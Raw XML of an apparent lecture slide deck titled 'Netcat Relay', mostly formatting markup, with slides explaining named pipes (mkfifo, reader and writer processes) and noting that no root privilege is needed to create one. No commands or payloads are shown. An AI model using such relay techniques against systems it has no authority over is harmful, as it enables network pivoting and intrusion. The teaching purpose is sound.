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gOSwlawynFivaR19CISVbXBQgCb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11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide7.xml"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide18.xml"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide6.xml"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide17.xml"/><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slide" Target="slides/slide15.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide2.xml"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide14.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7" name="Google Shape;87;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3" name="Google Shape;93;p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1" name="Google Shape;101;p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9" name="Google Shape;109;p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p5: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p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p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p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1" name="Google Shape;171;p9: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3" name="Google Shape;203;p11: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0" name="Google Shape;210;p12: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7" name="Google Shape;217;p13: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4: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5" name="Google Shape;225;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6" name="Google Shape;266;p16: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17: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18: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1" name="Google Shape;281;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20:notes"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="2" type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="1143000"/>
            <a:ext cx="41148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6"/>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6"/>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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Google Shape;18;p2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24" name="Google Shape;24;p2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8"/>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8"/>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rgbClr val="888888"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr sz="1800">
                <a:solidFill>
                  <a:srgbClr val="888888"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr indent="-228600" lvl="1" marL="914400" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="888888"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buNone/>
              <a:defRPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="888888"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr indent="-228600" lvl="2" marL="1371600" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="888888"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buNone/>
              <a:defRPr sz="1350">
                <a:solidFill>
                  <a:srgbClr val="888888"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr indent="-228600" lvl="3" marL="1828800" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="888888"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buNone/>
              <a:defRPr sz="1200">
                <a:solidFill>
                  <a:srgbClr val="888888"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr indent="-228600" lvl="4" marL="2286000" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="888888"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buNone/>
              <a:defRPr sz="1200">
                <a:solidFill>
                  <a:srgbClr val="888888"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr indent="-228600" lvl="5" marL="2743200" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="888888"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buNone/>
              <a:defRPr sz="1200">
                <a:solidFill>
                  <a:srgbClr val="888888"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr indent="-228600" lvl="6" marL="3200400" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="888888"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buNone/>
              <a:defRPr sz="1200">
                <a:solidFill>
                  <a:srgbClr val="888888"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr indent="-228600" lvl="7" marL="3657600" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="888888"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buNone/>
              <a:defRPr sz="1200">
                <a:solidFill>
                  <a:srgbClr val="888888"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr indent="-228600" lvl="8" marL="4114800" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="888888"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buNone/>
              <a:defRPr sz="1200">
                <a:solidFill>
                  <a:srgbClr val="888888"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p/>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Google Shape;30;p2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9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6286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6" name="Google Shape;36;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4629150" y="1825625"/>
            <a:ext cx="38862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37" name="Google Shape;37;p2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0"/>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0"/>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3" name="Google Shape;43;p30"/>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4" name="Google Shape;44;p30"/>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lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buNone/>
              <a:defRPr b="1" sz="1200"/>
            </a:lvl6pPr>
            <a:lvl7pPr indent="-228600" lvl="6" marL="3200400" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buNone/>
              <a:defRPr b="1" sz="1200"/>
            </a:lvl7pPr>
            <a:lvl8pPr indent="-228600" lvl="7" marL="3657600" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buNone/>
              <a:defRPr b="1" sz="1200"/>
            </a:lvl8pPr>
            <a:lvl9pPr indent="-228600" lvl="8" marL="4114800" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buNone/>
              <a:defRPr b="1" sz="1200"/>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p/>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Google Shape;45;p30"/>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46" name="Google Shape;46;p3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32"/>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32"/>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3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3"/>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3"/>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lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buChar char="•"/>
              <a:defRPr sz="1500"/>
            </a:lvl6pPr>
            <a:lvl7pPr indent="-323850" lvl="6" marL="3200400" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buChar char="•"/>
              <a:defRPr sz="1500"/>
            </a:lvl7pPr>
            <a:lvl8pPr indent="-323850" lvl="7" marL="3657600" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buChar char="•"/>
              <a:defRPr sz="1500"/>
            </a:lvl8pPr>
            <a:lvl9pPr indent="-323850" lvl="8" marL="4114800" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buChar char="•"/>
              <a:defRPr sz="1500"/>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p/>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="Google Shape;61;p33"/>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2" name="Google Shape;62;p3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4"/>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4"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="2" type="pic"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3887391" y="987426"/>
            <a:ext cx="4629150" cy="4873625"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="Google Shape;68;p34"/>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1050"/>
              <a:buNone/>
              <a:defRPr sz="1050"/>
            </a:lvl2pPr>
            <a:lvl3pPr indent="-228600" lvl="2" marL="1371600" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="900"/>
              <a:buNone/>
              <a:defRPr sz="900"/>
            </a:lvl3pPr>
            <a:lvl4pPr indent="-228600" lvl="3" marL="1828800" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="750"/>
              <a:buNone/>
              <a:defRPr sz="750"/>
            </a:lvl4pPr>
            <a:lvl5pPr indent="-228600" lvl="4" marL="2286000" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="750"/>
              <a:buNone/>
              <a:defRPr sz="750"/>
            </a:lvl5pPr>
            <a:lvl6pPr indent="-228600" lvl="5" marL="2743200" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="750"/>
              <a:buNone/>
              <a:defRPr sz="750"/>
            </a:lvl6pPr>
            <a:lvl7pPr indent="-228600" lvl="6" marL="3200400" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="750"/>
              <a:buNone/>
              <a:defRPr sz="750"/>
            </a:lvl7pPr>
            <a:lvl8pPr indent="-228600" lvl="7" marL="3657600" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="750"/>
              <a:buNone/>
              <a:defRPr sz="750"/>
            </a:lvl8pPr>
            <a:lvl9pPr indent="-228600" lvl="8" marL="4114800" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="750"/>
              <a:buNone/>
              <a:defRPr sz="750"/>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p/>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="Google Shape;69;p3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5"/>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75" name="Google Shape;75;p3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6"/>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6"/>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lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:lvl6pPr>
            <a:lvl7pPr indent="-342900" lvl="6" marL="3200400" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:lvl7pPr>
            <a:lvl8pPr indent="-342900" lvl="7" marL="3657600" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:lvl8pPr>
            <a:lvl9pPr indent="-342900" lvl="8" marL="4114800" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p/>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="Google Shape;81;p3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61950" lvl="0" marL="457200" marR="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="75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4325" lvl="3" marL="1828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4pPr>
            <a:lvl5pPr indent="-314325" lvl="4" marL="22860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5pPr>
            <a:lvl6pPr indent="-314325" lvl="5" marL="27432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6pPr>
            <a:lvl7pPr indent="-314325" lvl="6" marL="32004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7pPr>
            <a:lvl8pPr indent="-314325" lvl="7" marL="36576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8pPr>
            <a:lvl9pPr indent="-314325" lvl="8" marL="4114800" marR="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
              <a:defRPr b="0" i="0" sz="1350" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p/>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Google Shape;12;p2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2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Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr indent="0" lvl="1" marL="0" marR="0" rtl="0" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
              <a:defRPr b="0" i="0" sz="900" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="888888"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr indent="0" lvl="2" marL="0" marR="0" rtl="0" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
              <a:defRPr b="0" i="0" sz="900" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="888888"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr indent="0" lvl="3" marL="0" marR="0" rtl="0" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
              <a:defRPr b="0" i="0" sz="900" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="888888"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr indent="0" lvl="4" marL="0" marR="0" rtl="0" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
              <a:defRPr b="0" i="0" sz="900" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="888888"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr indent="0" lvl="5" marL="0" marR="0" rtl="0" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
              <a:defRPr b="0" i="0" sz="900" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="888888"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr indent="0" lvl="6" marL="0" marR="0" rtl="0" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
              <a:defRPr b="0" i="0" sz="900" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="888888"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr indent="0" lvl="7" marL="0" marR="0" rtl="0" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
              <a:defRPr b="0" i="0" sz="900" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="888888"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr indent="0" lvl="8" marL="0" marR="0" rtl="0" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
              <a:defRPr b="0" i="0" sz="9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 Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image2.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image10.png"/><Relationship Id="rId6"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12.png"/><Relationship Id="rId6"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
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="1122363"/>
            <a:ext cx="6858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500"/>
              <a:buFont typeface="Comic Sans MS"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Netcat Relay</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="Google Shape;90;p1"/>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1800"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans M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Named Pipe</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="Google Shape;96;p2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="1603432"/>
            <a:ext cx="7994516" cy="3880773"/>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1600"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Named pipes have a presence in the file system. That is, they show up as files. But unlike most files, they never appear to have contents (size is 0 byte)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Named pipe is created using mkfifo or mknod. Two separate processes can access the pipe by name — one process can open it as a reader, and the other as a writer</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Once the pipe has been read, it's empty, though it still will be visible as an empty file ready to be used again</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-69850" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-38100" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="Google Shape;97;p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98" name="Google Shape;98;p2"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4454089" y="3292451"/>
            <a:ext cx="3776690" cy="3429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Some Remarks</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="104" name="Google Shape;104;p3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609599" y="1428334"/>
            <a:ext cx="7994516" cy="3880773"/>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000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>You do not need the root privilege to create a named pipe as long as you can write the pipe to a directory</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
